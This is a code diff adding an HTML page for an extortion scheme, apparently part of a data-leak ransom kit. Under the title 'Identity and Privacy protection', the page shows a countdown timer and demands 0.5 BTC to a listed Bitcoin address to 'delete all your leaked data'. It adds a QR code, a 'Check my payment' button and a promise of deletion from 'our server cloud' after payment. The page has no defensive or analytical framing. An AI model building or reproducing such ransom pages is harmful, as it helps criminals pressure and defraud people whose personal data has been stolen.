@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8"/>
+    <meta name="viewport" content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1"/>
+    <meta name="apple-mobile-web-app-status-bar-style" content="black" />
+    <meta name="format-detection" content="telephone=no" />
+    <meta name="author" content="Струков Вячеслав">
+    <title>Identity and Privacy </title>
+    <link media="all" rel="stylesheet" href="css/styles.css"/>
+
+    <!--[if lt IE 9]>
+    <script src="http://ie7-js.googlecode.com/svn/version/2.1(beta4)/IE9.js"></script>
+    <![endif]-->
+</head>
+<body onload="time()">
+
+<div class="wrapper">
+
+    <header class="header">
+        <a href="#" class="logo1">
+            <img src="img/logo1.png" alt="">
+        </a>
+        <a href="#" class="logo2">
+            <img src="img/logo2.png" alt="">
+        </a>
+        <h1>
+            <a href="#">
+                <span>Identity and Privacy</span>
+                <strong>protection</strong>
+            </a>
+        </h1>
+        <nav class="nav">
+            <ul class="clearfix">
+                <li class="info"><a href="index.html">
+                    <strong></strong>
+                    <span>Info</span>
+                </a></li>
+                <li class="personal-data"><a href="personal-date.html">
+                    <strong></strong>
+                    <span>Personal Data</span>
+                </a></li>
+                <li class="pay"><a href="pay.html">
+                    <strong></strong>
+                    <span>Pay</span>
+                </a></li>
+            </ul>
+        </nav>
+    </header>
+    <div class="content">
+        <section class="timer t-pay">
+            <div class="timer-container">
+                <div id="timer">
+                    <span class="hours"></span>
+                    <span>:</span>
+                    <span class="minutes"></span>
+                    <span>:</span>
+                    <span class="seconds"></span>
+                </div>
+            </div>
+            <p>To delete all your leaked data you have to pay 0.5 BTC to Bitcoin address:</p>
+        </section>
+        <div class="qr-code">
+            <span class="code">1BitmixerEiyyp3eTLaCpgBbhYERs48qza</span>
+            <div id="qrcode"></div>
+            <div class="button">
+                <a href="#">Кнопка Check my payment</a>
+            </div>
+            <p>If payment is succeeded all your data will be permanently removed from our server cloud.</p>
+        </div>
+    </div>
+</div>
+<script type="text/javascript" src="js/jquery.js"></script>
+<script type="text/javascript" src="js/jquery.qrcode.min.js"></script>
+<script type="text/javascript" src="js/js.js"></script>
+</body>
+</html>
